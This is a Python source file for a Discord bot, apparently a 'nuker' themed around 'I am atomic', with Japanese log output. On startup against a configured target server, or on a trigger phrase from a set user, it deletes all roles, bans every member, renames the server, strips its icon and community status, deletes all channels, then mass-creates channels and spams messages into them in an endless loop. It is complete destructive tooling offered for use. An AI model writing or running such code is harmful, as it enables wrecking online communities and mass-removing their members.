import yaml
import random
import colorama
import nextcord

with open("config.yml", "r", encoding="utf-8", errors="ignore") as file:
    config = yaml.safe_load(file)

colorama.init(convert=True)
client = nextcord.Client(intents=nextcord.Intents.all())

@client.event
async def on_ready():
    print(f"{colorama.Fore.GREEN}シャドウが目覚めました{colorama.Fore.RESET}")

    if config["i_am_atomic_rader"]:
        guild = client.get_guild(config["target"])
        if guild == None:
            print("アイ・アム・アトミッ...あれ？逃げたか...")
            return
        print("アイ・アム・アトミック！")
        await nuke(guild)

@client.event
async def on_guild_channel_create(channel):
    if channel.type != nextcord.ChannelType.text:
        return
    elif not config["i_am_allrange_atomic"]:
        return
    
    while True:
        try:
            message = random.choice(config["contents"])
            await channel.send(message)
            print(f"{colorama.Fore.GREEN}メッセージを送信しました:{colorama.Fore.RESET} {message}")
        except:
            print(f"{colorama.Fore.RED}メッセージの送信に失敗しました{colorama.Fore.RESET}")
    
@client.event
async def on_message(message):
    if message.content != "i am atomic":
        return
    elif message.author.id != config["shadow"]:
        return
    
    await message.delete()
    await nuke(message.guild)
    
async def nuke(guild):
    if config["i_am_atomic_rain"]:
        try:
            for role in guild.roles:
                try:
                    await role.delete()
                    print(f"{colorama.Fore.GREEN}ロールを削除しました:{colorama.Fore.RESET} {role.name}")
                except:
                    print(f"{colorama.Fore.RED}ロールの削除に失敗しました{colorama.Fore.RESET}")
        except:
            print(f"{colorama.Fore.RED}ロールの削除処理に失敗しました{colorama.Fore.RESET}")
    
    if config["i_am_allrange_atomic"]:
        try:
            for member in guild.members:
                try:
                    await member.ban()
                    print(f"{colorama.Fore.GREEN}メンバーをBANしました:{colorama.Fore.RESET} {member.name}")
                except:
                    print(f"{colorama.Fore.RED}BANに失敗しました{colorama.Fore.RESET}")
        except:
            print(f"{colorama.Fore.RED}BANの処理に失敗しました{colorama.Fore.RESET}")

    if config["im_atomic"]:
        try:
            await guild.edit(name=config["server_name"])
            print(f"{colorama.Fore.GREEN}サーバー名を変更しました{colorama.Fore.RESET}")
        except:
            print(f"{colorama.Fore.RED}サーバー名の変更に失敗しました{colorama.Fore.RESET}")

        if config["disable_icon"]:
            try:
                await guild.edit(icon=None)
                print(f"{colorama.Fore.GREEN}サーバーのアイコンを削除しました{colorama.Fore.RESET}")
            except:
                print(f"{colorama.Fore.RED}サーバーのアイコン削除に失敗しました{colorama.Fore.RESET}")

        if config["disable_comm"]:
            try:
                await guild.edit(community=False)
                print(f"{colorama.Fore.GREEN}コミュニティサーバーを解除しました{colorama.Fore.RESET}")
            except:
                print(f"{colorama.Fore.RED}コミュニティサーバーの削除に失敗しました{colorama.Fore.RESET}")

        if config["allow_admin"]:
            try:
                role = guild.default_role
                print(f"{colorama.Fore.GREEN}ロールを編集しました{colorama.Fore.RESET}")
            except:
                print(f"{colorama.Fore.RED}ロールの編集に失敗しました{colorama.Fore.RESET}")

    if config["i_am_allrange_atomic"]:
        try:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{colorama.Fore.GREEN}チャンネルの削除に成功しました:{colorama.Fore.RESET} {channel.name}")
                except:
                    print(f"{colorama.Fore.RED}チャンネルの削除に失敗しました{colorama.Fore.RESET}")
        except:
            print(f"{colorama.Fore.RED}チャンネルの削除処理に失敗しました{colorama.Fore.RESET}")

        for i in range(config["limit"]):
            try:
                name = random.choice(config["names"])
                await guild.create_text_channel(name=name)
                print(f"{colorama.Fore.GREEN}チャンネルの作成に成功しました:{colorama.Fore.RESET} {name}")
            except:
                print(f"{colorama.Fore.RED}チャンネルの作成に失敗しました{colorama.Fore.RESET}")
        
try:
    client.run(config["token"])
except:
    print(f"{colorama.Fore.RED}シャドウが目覚めることはなかった...{colorama.Fore.RESET}")